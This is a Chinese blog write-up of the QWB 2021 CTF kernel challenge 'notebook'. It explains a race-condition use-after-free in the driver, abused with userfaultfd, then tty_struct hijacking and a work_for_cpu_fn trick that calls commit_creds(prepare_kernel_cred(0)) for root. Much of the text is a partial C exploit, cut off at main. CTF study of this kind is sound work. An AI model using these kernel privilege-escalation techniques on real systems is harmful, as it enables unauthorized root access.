<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>QWB2021-notebook-WP - blog of chuj</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="强网杯的时候我还一点都不会 kernel pwn，这道题看都没看。这两天尝试复现了一下，从前天下午一直弄到现在才搞出来，费了不少时间，也学到了一些东西，特"><meta property="og:image" content><meta property="og:title" content="QWB2021-notebook-WP"><meta property="og:description" content="强网杯的时候我还一点都不会 kernel pwn，这道题看都没看。这两天尝试复现了一下，从前天下午一直弄到现在才搞出来，费了不少时间，也学到了一些东西，特"><meta property="og:type" content="article"><meta property="og:url" content="https://www.cjovi.icu/wp/1468.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-07-15T23:16:00+00:00"><meta property="article:modified_time" content="2021-07-15T23:16:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="QWB2021-notebook-WP"><meta name=twitter:description content="强网杯的时候我还一点都不会 kernel pwn，这道题看都没看。这两天尝试复现了一下，从前天下午一直弄到现在才搞出来，费了不少时间，也学到了一些东西，特"><script src=https://www.cjovi.icu/js/feather.min.js></script>
<link href=https://www.cjovi.icu/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://www.cjovi.icu/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://www.cjovi.icu/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://www.cjovi.icu/>blog of chuj</a></div><nav><a href=/>Home</a>
<a href=/posts.html>All posts</a>
<a href=/about.html>About</a>
<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>QWB2021-notebook-WP</h1><div class=meta>Posted on Jul 15, 2021</div></div><section class=body><p>强网杯的时候我还一点都不会 kernel pwn，这道题看都没看。这两天尝试复现了一下，从前天下午一直弄到现在才搞出来，费了不少时间，也学到了一些东西，特别地，学习到了之前学习 userfaultfd 和 tty attack 时一些自己不知道自己不知道的知识（这里没有打错哦 ^_^）。</p><p>首先看一下启动脚本</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span><span style=color:#007020>#!/bin/sh
</span></span></span><span style=display:flex><span><span style=color:#007020></span>stty intr ^<span style=color:#666>]</span>
</span></span><span style=display:flex><span>qemu-system-x86_64 <span style=color:#4070a0;font-weight:700>\
</span></span></span><span style=display:flex><span><span style=color:#4070a0;font-weight:700></span>    -m 64M <span style=color:#4070a0;font-weight:700>\
</span></span></span><span style=display:flex><span><span style=color:#4070a0;font-weight:700></span>    -kernel bzImage <span style=color:#4070a0;font-weight:700>\
</span></span></span><span style=display:flex><span><span style=color:#4070a0;font-weight:700></span>    -initrd rootfs.cpio <span style=color:#4070a0;font-weight:700>\
</span></span></span><span style=display:flex><span><span style=color:#4070a0;font-weight:700></span>    -append <span style=color:#4070a0>&#34;loglevel=3 console=ttyS0 oops=panic panic=1 kaslr&#34;</span> <span style=color:#4070a0;font-weight:700>\
</span></span></span><span style=display:flex><span><span style=color:#4070a0;font-weight:700></span>    -nographic -net user -net nic -device e1000 <span style=color:#4070a0;font-weight:700>\
</span></span></span><span style=display:flex><span><span style=color:#4070a0;font-weight:700></span>    -smp <span style=color:#bb60d5>cores</span><span style=color:#666>=</span>2,threads<span style=color:#666>=</span><span style=color:#40a070>2</span> -cpu kvm64,+smep,+smap <span style=color:#4070a0;font-weight:700>\
</span></span></span><span style=display:flex><span><span style=color:#4070a0;font-weight:700></span>    -monitor /dev/null 2&gt;/dev/null -s
</span></span></code></pre></div><p>append 时把 loglevel 开到了 3，建议把这个去掉，调试起来会好判断一点（可以看到驱动 printk 的内容）。</p><p>然后 run 一下，发现启动要 20 秒左右，非常的慢，让我很不爽，我也不知道具体是什么造成的，反正和 etc 文件夹里面的东西有关，打包的时候可以先不把这个文件夹打进去，可以少浪费一些生命。</p><p>程序的流程比较简单，也没有去符号，这里就不分析了。程序主要的漏洞就是条件竞争造成的 UAF。</p><p>首先先说一下读写锁，之前学操作系统的时候没有特别全面，不了解读写锁的特性，导致昨天一天都无法理解为什么不能按照预想的情况竞争。其实读写锁还是很好理解的，其性质为</p><ul><li>当写锁被取走时，所有取锁操作被阻塞</li><li>当读锁被取走时，取写锁的操作被阻塞</li></ul><p>恰当的使用读写锁可以在提高程序性能的前提下保证线程同步。题目中的驱动程序在 noteedit 和 noteadd 操作中取了读锁，仅在 notedel 操作中取了写锁。其余操作都没有锁保护。而两个取读锁的操作实际上都有写操作，但是他们又是可以并发的，这样就很可能存在条件竞争的漏洞。</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/07/1198216017.png></div><p>这是 noteedit 操作的部分代码，这里的 krealloc 并未对 newsize 做任何限制。同时并没有及时更新 note 指针，反而在更新前加入了 copy_from_user 的操作，那么就可以考虑通过 userfaultfd 操作卡死当前线程，避免 note 的更新，这样就可以保留一个被 kfree 的 slab 的指针。这样操作的问题是 note 的 size 被更新为了 0，之后 read 和 write 操作就无法读写数据了。</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/07/2757837246.png></div><p>不过在 add 操作时，也类似的在更新 size 前加入了 copy_from_user 的操作，我们也可以把线程卡死在这里，把 size 改为 0x60。</p><p>因此，我们可以做到</p><ul><li>申请任意大小的 slab。虽然 add 操作限制了 size 最大为 0x60，但是通过 edit 可以 krealloc 出任意大小的 slab</li><li>UAF 任意大小的 slab。不过只能控制前 0x60 字节的数据</li></ul><p>那么利用方法就是，首先通过 UAF 实现对一个 tty_struct 的前 0x60 字节的任意读写，leak 出内核地址。然后可以做 rop，但是在看长亭的 WP 时，学到了一个很有趣的 trick，<a href=https://zhuanlan.zhihu.com/p/385645268>原文链接</a>。这里引用原文</p><blockquote><p>控制 rip 之后，下一步就是绕过 SMEP 和 SMAP 了，这里介绍一种在完全控制了 tty 对象的情况下非常好用的 trick，完全不用 ROP，非常简单，且非常稳定（我们的 exploit 在利用成功和可以正常退出程序，甚至关机都不会触发 kernel panic）。</p><p>内核中有这样的一个函数：</p><p><img src=https://www.cjovi.icu/usr/uploads/2021/07/95471730.jpg alt=img></p><p>其编译后大概长这样：</p><p><img src=https://www.cjovi.icu/usr/uploads/2021/07/1208631729.jpg alt=img></p><p>该函数位于 workqueue 机制的实现中，只要是开启了多核支持的内核 （CONFIG_SMP）都会包含这个函数的代码。不难注意到，这个函数非常好用，只要能控制第一个参数指向的内存，即可实现带一个任意参数调用任意函数，并把返回值存回第一个参数指向的内存的功能，且该 &ldquo;gadget&rdquo; 能干净的返回，执行的过程中完全不用管 SMAP、SMEP 的事情。由于内核中大量的 read / write / ioctl 之类的实现的第一个参数也都恰好是对应的对象本身，可谓是非常的适合这种场景了。考虑到我们提权需要做的事情只是 commit_creds(prepare_kernel_cred(0))，完全可以用两次上述的函数调用原语实现。（如果还需要禁用 SELinux 之类的，再找一个任意地址写 0 的 gadget 即可，很容易找）</p></blockquote><p>利用这个原语就可以比较容易的任意函数执行了。</p><h3 id=715-的失败尝试>7.15 的失败尝试</h3><p>根据之前的分析和小 trick，我有了自己的 exp</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;stdio.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;stdlib.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;fcntl.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;syscall.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;poll.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;unistd.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;pthread.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;string.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;stdint.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;linux/userfaultfd.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;sys/ioctl.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;sys/mman.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;assert.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020></span>
</span></span><span style=display:flex><span><span style=color:#007020>#define PAGE_SIZE 0x1000
</span></span></span><span style=display:flex><span><span style=color:#007020>#define TTY_STRUCT_SZIE 0x2E0
</span></span></span><span style=display:flex><span><span style=color:#007020></span>
</span></span><span style=display:flex><span>size_t work_for_cpu_fn_off <span style=color:#666>=</span> <span style=color:#40a070>0xffffffff8949eb90</span> <span style=color:#666>-</span> <span style=color:#40a070>0xffffffff8a28e440</span>;
</span></span><span style=display:flex><span>size_t prepare_kernel_cred_off <span style=color:#666>=</span> <span style=color:#40a070>0xffffffffa14a9ef0</span> <span style=color:#666>-</span> <span style=color:#40a070>0xffffffffa228e440</span>;
</span></span><span style=display:flex><span>size_t commit_creds_off <span style=color:#666>=</span> <span style=color:#40a070>0xffffffffa14a9b40</span> <span style=color:#666>-</span> <span style=color:#40a070>0xffffffffa228e440</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>userarg</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	size_t idx;
</span></span><span style=display:flex><span>	size_t size;
</span></span><span style=display:flex><span>	<span style=color:#902000>void</span><span style=color:#666>*</span> buf;
</span></span><span style=display:flex><span>};
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#902000>int</span> note_fd;
</span></span><span style=display:flex><span><span style=color:#902000>void</span><span style=color:#666>*</span> stuck_mapped_memory;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>ErrExit</span>(<span style=color:#902000>char</span><span style=color:#666>*</span> err_msg)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	puts(err_msg);
</span></span><span style=display:flex><span>	exit(<span style=color:#666>-</span><span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>RegisterUserfault</span>(<span style=color:#902000>void</span> <span style=color:#666>*</span>fault_page, <span style=color:#902000>void</span><span style=color:#666>*</span> handler)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	pthread_t thr;
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>uffdio_api</span> ua;
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>uffdio_register</span> ur;
</span></span><span style=display:flex><span>	<span style=color:#902000>uint64_t</span> uffd  <span style=color:#666>=</span> syscall(__NR_userfaultfd, O_CLOEXEC <span style=color:#666>|</span> O_NONBLOCK);
</span></span><span style=display:flex><span>	ua.api <span style=color:#666>=</span> UFFD_API;
</span></span><span style=display:flex><span>	ua.features    <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (ioctl(uffd, UFFDIO_API, <span style=color:#666>&amp;</span>ua) <span style=color:#666>==</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>		ErrExit(<span style=color:#4070a0>&#34;[-] ioctl-UFFDIO_API&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	ur.range.start <span style=color:#666>=</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>)fault_page; <span style=color:#60a0b0;font-style:italic>//我们要监视的区域
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	ur.range.len   <span style=color:#666>=</span> PAGE_SIZE;
</span></span><span style=display:flex><span>	ur.mode        <span style=color:#666>=</span> UFFDIO_REGISTER_MODE_MISSING;
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (ioctl(uffd, UFFDIO_REGISTER, <span style=color:#666>&amp;</span>ur) <span style=color:#666>==</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>) <span style=color:#60a0b0;font-style:italic>//注册缺页错误处理，当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>		ErrExit(<span style=color:#4070a0>&#34;[-] ioctl-UFFDIO_REGISTER&#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#60a0b0;font-style:italic>//开一个线程，接收错误的信号，然后处理
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	<span style=color:#902000>int</span> s <span style=color:#666>=</span> pthread_create(<span style=color:#666>&amp;</span>thr, <span style=color:#007020>NULL</span>,handler, (<span style=color:#902000>void</span><span style=color:#666>*</span>)uffd);
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (s<span style=color:#666>!=</span><span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>		ErrExit(<span style=color:#4070a0>&#34;[-] pthread_create&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>noteadd</span>(size_t idx, size_t size, <span style=color:#902000>void</span><span style=color:#666>*</span> buf)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>userarg</span> notearg;
</span></span><span style=display:flex><span>	notearg.idx <span style=color:#666>=</span> idx;
</span></span><span style=display:flex><span>	notearg.size <span style=color:#666>=</span> size;
</span></span><span style=display:flex><span>	notearg.buf <span style=color:#666>=</span> buf;
</span></span><span style=display:flex><span>	ioctl(note_fd, <span style=color:#40a070>0x100</span>, <span style=color:#666>&amp;</span>notearg);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>notegift</span>(<span style=color:#902000>void</span><span style=color:#666>*</span> buf)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>userarg</span> notearg;
</span></span><span style=display:flex><span>	notearg.idx <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>	notearg.size <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>	notearg.buf <span style=color:#666>=</span> buf;
</span></span><span style=display:flex><span>	ioctl(note_fd, <span style=color:#40a070>0x64</span>, <span style=color:#666>&amp;</span>notearg);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>notedel</span>(size_t idx)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>userarg</span> notearg;
</span></span><span style=display:flex><span>	notearg.idx <span style=color:#666>=</span> idx;
</span></span><span style=display:flex><span>	notearg.size <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>	notearg.buf <span style=color:#666>=</span> <span style=color:#007020>NULL</span>;
</span></span><span style=display:flex><span>	ioctl(note_fd, <span style=color:#40a070>0x200</span>, <span style=color:#666>&amp;</span>notearg);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>noteedit</span>(size_t idx, size_t size, <span style=color:#902000>void</span><span style=color:#666>*</span> buf)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>userarg</span> notearg;
</span></span><span style=display:flex><span>	notearg.idx <span style=color:#666>=</span> idx;
</span></span><span style=display:flex><span>	notearg.size <span style=color:#666>=</span> size;
</span></span><span style=display:flex><span>	notearg.buf <span style=color:#666>=</span> buf;
</span></span><span style=display:flex><span>	ioctl(note_fd, <span style=color:#40a070>0x300</span>, <span style=color:#666>&amp;</span>notearg);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>OpenNote</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	note_fd <span style=color:#666>=</span> open(<span style=color:#4070a0>&#34;/dev/notebook&#34;</span>, O_RDWR);
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (note_fd <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		ErrExit(<span style=color:#4070a0>&#34;[-] err in open notebook device&#34;</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#902000>void</span><span style=color:#666>*</span> <span style=color:#06287e>userfaultfd_sleep3_handler</span>(<span style=color:#902000>void</span><span style=color:#666>*</span> arg)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>uffd_msg</span> msg;
</span></span><span style=display:flex><span>	<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span> uffd <span style=color:#666>=</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>) arg;
</span></span><span style=display:flex><span>	puts(<span style=color:#4070a0>&#34;[+] sleep3 handler created&#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#902000>int</span> nready;
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>pollfd</span> pollfd;
</span></span><span style=display:flex><span>	pollfd.fd <span style=color:#666>=</span> uffd;
</span></span><span style=display:flex><span>	pollfd.events <span style=color:#666>=</span> POLLIN;
</span></span><span style=display:flex><span>	nready <span style=color:#666>=</span> poll(<span style=color:#666>&amp;</span>pollfd, <span style=color:#40a070>1</span>, <span style=color:#666>-</span><span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>	puts(<span style=color:#4070a0>&#34;[+] sleep3 handler unblocked&#34;</span>);
</span></span><span style=display:flex><span>	sleep(<span style=color:#40a070>3</span>);
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (nready <span style=color:#666>!=</span> <span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		ErrExit(<span style=color:#4070a0>&#34;[-] Wrong poll return val&#34;</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	nready <span style=color:#666>=</span> read(uffd, <span style=color:#666>&amp;</span>msg, <span style=color:#007020;font-weight:700>sizeof</span>(msg));
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (nready <span style=color:#666>&lt;=</span> <span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		ErrExit(<span style=color:#4070a0>&#34;[-] msg err&#34;</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#902000>char</span><span style=color:#666>*</span> page <span style=color:#666>=</span> (<span style=color:#902000>char</span><span style=color:#666>*</span>) mmap(<span style=color:#007020>NULL</span>, PAGE_SIZE, PROT_READ <span style=color:#666>|</span> PROT_WRITE, MAP_PRIVATE <span style=color:#666>|</span> MAP_ANONYMOUS, <span style=color:#666>-</span><span style=color:#40a070>1</span>, <span style=color:#40a070>0</span>);
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (page <span style=color:#666>==</span> MAP_FAILED)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		ErrExit(<span style=color:#4070a0>&#34;[-] mmap err&#34;</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>uffdio_copy</span> uc;
</span></span><span style=display:flex><span>	<span style=color:#60a0b0;font-style:italic>// init page
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	memset(page, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(page));
</span></span><span style=display:flex><span>	uc.src <span style=color:#666>=</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>) page;
</span></span><span style=display:flex><span>	uc.dst <span style=color:#666>=</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>) msg.arg.pagefault.address <span style=color:#666>&amp;</span> <span style=color:#666>~</span>(PAGE_SIZE <span style=color:#666>-</span> <span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>	uc.len <span style=color:#666>=</span> PAGE_SIZE;
</span></span><span style=display:flex><span>	uc.mode <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>	uc.copy <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>	ioctl(uffd, UFFDIO_COPY, <span style=color:#666>&amp;</span>uc);
</span></span><span style=display:flex><span>	puts(<span style=color:#4070a0>&#34;[+] sleep3 handler done&#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>return</span> <span style=color:#007020>NULL</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#902000>void</span><span style=color:#666>*</span> <span style=color:#06287e>userfaultfd_stuck_handler</span>(<span style=color:#902000>void</span><span style=color:#666>*</span> arg)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>uffd_msg</span> msg;
</span></span><span style=display:flex><span>	<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span> uffd <span style=color:#666>=</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>) arg;
</span></span><span style=display:flex><span>	puts(<span style=color:#4070a0>&#34;[+] stuck handler created&#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#902000>int</span> nready;
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>pollfd</span> pollfd;
</span></span><span style=display:flex><span>	pollfd.fd <span style=color:#666>=</span> uffd;
</span></span><span style=display:flex><span>	pollfd.events <span style=color:#666>=</span> POLLIN;
</span></span><span style=display:flex><span>	nready <span style=color:#666>=</span> poll(<span style=color:#666>&amp;</span>pollfd, <span style=color:#40a070>1</span>, <span style=color:#666>-</span><span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>	puts(<span style=color:#4070a0>&#34;[+] stuck handler unblocked&#34;</span>);
</span></span><span style=display:flex><span>	pause();
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (nready <span style=color:#666>!=</span> <span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		ErrExit(<span style=color:#4070a0>&#34;[-] Wrong poll return val&#34;</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	nready <span style=color:#666>=</span> read(uffd, <span style=color:#666>&amp;</span>msg, <span style=color:#007020;font-weight:700>sizeof</span>(msg));
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (nready <span style=color:#666>&lt;=</span> <span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		ErrExit(<span style=color:#4070a0>&#34;[-] msg err&#34;</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#902000>char</span><span style=color:#666>*</span> page <span style=color:#666>=</span> (<span style=color:#902000>char</span><span style=color:#666>*</span>) mmap(<span style=color:#007020>NULL</span>, PAGE_SIZE, PROT_READ <span style=color:#666>|</span> PROT_WRITE, MAP_PRIVATE <span style=color:#666>|</span> MAP_ANONYMOUS, <span style=color:#666>-</span><span style=color:#40a070>1</span>, <span style=color:#40a070>0</span>);
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (page <span style=color:#666>==</span> MAP_FAILED)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		ErrExit(<span style=color:#4070a0>&#34;[-] mmap err&#34;</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>uffdio_copy</span> uc;
</span></span><span style=display:flex><span>	<span style=color:#60a0b0;font-style:italic>// init page
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	memset(page, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(page));
</span></span><span style=display:flex><span>	uc.src <span style=color:#666>=</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>) page;
</span></span><span style=display:flex><span>	uc.dst <span style=color:#666>=</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>) msg.arg.pagefault.address <span style=color:#666>&amp;</span> <span style=color:#666>~</span>(PAGE_SIZE <span style=color:#666>-</span> <span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>	uc.len <span style=color:#666>=</span> PAGE_SIZE;
</span></span><span style=display:flex><span>	uc.mode <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>	uc.copy <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>	ioctl(uffd, UFFDIO_COPY, <span style=color:#666>&amp;</span>uc);
</span></span><span style=display:flex><span>	puts(<span style=color:#4070a0>&#34;[+] stuck handler done&#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>return</span> <span style=color:#007020>NULL</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#902000>void</span><span style=color:#666>*</span> <span style=color:#06287e>edit_thread</span>(<span style=color:#902000>int</span> idx)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	puts(<span style=color:#4070a0>&#34;[+] edit thread start!&#34;</span>);
</span></span><span style=display:flex><span>	noteedit(idx, <span style=color:#40a070>0</span>, stuck_mapped_memory);
</span></span><span style=display:flex><span>	puts(<span style=color:#4070a0>&#34;[+] edit thread end!&#34;</span>); <span style=color:#60a0b0;font-style:italic>// won&#39;t reach here
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	<span style=color:#007020;font-weight:700>return</span> <span style=color:#007020>NULL</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#902000>void</span><span style=color:#666>*</span> <span style=color:#06287e>add_thread</span>(<span style=color:#902000>int</span> idx)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	puts(<span style=color:#4070a0>&#34;[+] add thread start!&#34;</span>);
</span></span><span style=display:flex><span>	noteadd(idx, <span style=color:#40a070>0x60</span>, stuck_mapped_memory);
</span></span><span style=display:flex><span>	puts(<span style=color:#4070a0>&#34;[+] add thread end!&#34;</span>); <span style=color:#60a0b0;font-style:italic>// won&#39;t reach here
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	<span style=color:#007020;font-weight:700>return</span> <span style=color:#007020>NULL</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#902000>char</span> buf_a[<span style=color:#40a070>0x500</span>] <span style=color:#666>=</span> {<span style=color:#4070a0>&#34;aaa&#34;</span>};
</span></span><span style=display:flex><span>size_t buf_tty[<span style=color:#40a070>0x100</span>], buf_fake_table[<span style=color:#40a070>0x500</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#902000>int</span> <span style=color:#06287e>main</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#902000>int</span> pid;
